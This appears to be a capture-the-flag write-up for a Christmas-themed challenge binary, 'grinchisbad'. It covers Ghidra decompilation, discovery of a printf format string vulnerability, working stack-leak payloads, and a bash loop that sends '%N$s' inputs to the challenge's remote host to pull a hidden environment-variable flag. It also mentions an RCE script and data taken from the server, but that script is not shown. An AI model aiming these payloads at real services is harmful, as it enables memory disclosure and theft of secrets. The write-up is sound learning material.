I started using strings. Multiple flags occured. I would not test all these. I then started Ghidra to dissasemble and I found this function.

```cpp
void main(void) {
  int iVar1;
  time_t tVar2;
  long in_FS_OFFSET;
  time_t local_180;
  char *local_178 [4];
  char *local_158;
  char *local_150;
  char *local_148;
  char *local_140;
  char *local_138;
  char local_128 [280];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_178[0] = "${IStole0xDEADBABE}";
  local_178[1] = "${PleaseDontEatMe!}";
  local_178[2] = "${IWonderWhere0xCAFED00DIs}";
  local_178[3] = "${ILeftAGoodJobAtThe0x0FF1CE}";
  local_158 = "${RunRunRudolph!}";
  local_150 = "${WhyIsThisHere?}";
  local_148 = "${IReallyLoveDJOiler}";
  local_140 = "${ComeOnAndFlyWithSanta!}";
  local_138 = "${CatNipForAll!}";
  tVar2 = time(&local_180);
  srand((uint)tVar2);
  iVar1 = rand();
  printf("Do you know where the Grinch is? ");
  fgets(local_128,0x100,stdin);
  printf("\nMaybe so, I don\'t know, ");
  echo(local_128);
  puts(local_178[iVar1 % 9]);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Seems like it asks for something, just outputs it and disregards it.  Then it uses iVar1 to get a random flag between 0 and 9. Which I think Ghidra wrongly dissasembled the other flags at own unused variables. I'll try to cleanup what I think is happening:

```cpp
void main(void) {
  int rnd;
  long in_FS_OFFSET;
  long initialStackPointer;
  time_t tVar2;
  time_t local_180;
  char input [280];
  
  initialStackPointer = *(long *)(in_FS_OFFSET + 0x28);

  flags[0] = "${IStole0xDEADBABE}";
  flags[1] = "${PleaseDontEatMe!}";
  flags[2] = "${IWonderWhere0xCAFED00DIs}";
  flags[3] = "${ILeftAGoodJobAtThe0x0FF1CE}";
  flags[4] = "${RunRunRudolph!}";
  flags[5] = "${WhyIsThisHere?}";
  flags[6] = "${IReallyLoveDJOiler}";
  flags[7] = "${ComeOnAndFlyWithSanta!}";
  flags[8] = "${CatNipForAll!}";

  tVar2 = time(&local_180);
  srand((uint)tVar2);
  rnd = rand();
  printf("Do you know where the Grinch is? ");
  fgets(input,0x100,stdin);
  printf("\nMaybe so, I don\'t know, ");
  printf(input); // This echo is just printf. Unessesary extras
  puts(flags[rnd % 9]);


  // Some stack smashing check
  if (initialStackPointer != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Doing a whole lot overflow testing but seems to not work. Nothing. Googling "printf exploits" leads me to [OWASP - Format String Attack](https://owasp.org/www-community/attacks/Format_string_attack) which in case leads me to the [Format String Vulnerability](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/)! 

> **_INFO:_** I now got a new binary, that echo function is removed. But now the binary is the same as on server! So instead of echo it is just a printf. Still same vulnerability.

Finally a breakthrough. I'll now research how to exploit this. Googling a bit more gave me this valuable [PDF](https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf)

So this allows me to output data from the current stack. 

```bash
$ python3 -c "print('AAAA' + '%08x.'*20)" | ./grinchisbad

Do you know where the Grinch is? 
Maybe so, I don't know, AAAA00000020.00000000.00000000.011c1719.00000000.00000000.6398f3ab.00400928.0040093c.00400950.0040096c.0040098a.0040099c.004009ae.004009c4.004009de.00000000.41414141.3830252e.252e7838.
${RunRunRudolph!}
```

This shows me that my input is located at the 18th position. I still do not know where that is. Is it in the front of the stack, back? I am clueless at this moment. But it shows 41414141 which is AAAA.

I sound found a shorthand to do this, get the value from the 18th position:

```bash
$ echo 'AAAA.%18$08x' | ./grinchisbad

Do you know where the Grinch is? 
Maybe so, I don't know, AAAA.41414141
${ILeftAGoodJobAtThe0x0FF1CE}
```

After a while I see that I can get more data out from it by doing: `%11$s` as the input. The X above is to output in hex, S is to output as string. So basically I get the content at stack position 1 and ouputs as string. So trying stack position 11 down to 8 it starts segment fault at 7. Why is this?

```bash
$ echo '%11$s' | ./grinchisbad
%11$s
Do you know where the Grinch is? 
Maybe so, I don't know, ${ILeftAGoodJobAtThe0x0FF1CE}
${IStole0xDEADBABE}
```

Looking at the startup wrapper code it seems to have stack 0x0000008 so is 8 the first stack address? This I really dont understand how works. But it matches up that 8 is the first. 

```c
void _start(undefined8 param_1,undefined8 param_2,undefined8 param_3)

{
  undefined8 unaff_retaddr;
  undefined auStack_8 [8];
  
  __libc_start_main(main,unaff_retaddr,&stack0x00000008,__libc_csu_init,__libc_csu_fini,param_3,
                    auStack_8);
  do {
                    /* WARNING: Do nothing block with infinite loop */
  } while( true );
}
```

So where is the last? As I started to see my own input at 18 I guess that is the end of it. Stack is between 8 and 18. So 10 addresses for this software I guess? **If anyone care to explain how to figure this out if it is correct and what. Please dm me!**

So wit h that in mind I made a bash script which just ran through 0 to 1000 to see if I got something funny out. 

```bash
for i in `seq 1 1000`;
do
    clear
    echo "i: $i"
    echo  '%'$i'$s' | nc grinchisbad.norwayeast.azurecontainer.io 2424
    sleep .5
done
```

Closer to 80 I begin to see computer details. So I change it to `seq 80 100` and set sleep to be 1 second so I can cancel if I see anything interesting. And behold the hidden flag. Hidden as an enviroment variable way out in 95!

```bash
i: 95
%95$s
Do you know where the Grinch is? 
Maybe so, I don't know, CKRET_FLAG=${Grinch_Stole_My_0xD15C0BABE!}
${ComeOnAndFlyWithSanta!}
```

I try this, and bingo! I would really love to learn how to exploit this a bit more. Understand how it works. 

In this git repo I've included the files:

- libc (Libc version used for compiling)
- grinchisbad (Original not quite the same as server but still exploitable)
- grinchisbad_server (Correct binary)
- remote.py (StateOfLimbo's attempt at RCE which works)
- exploit.sh (My exploit!)

In folder rce-data is things i stole from the server with the rce (source code for grinchisbad and printenv)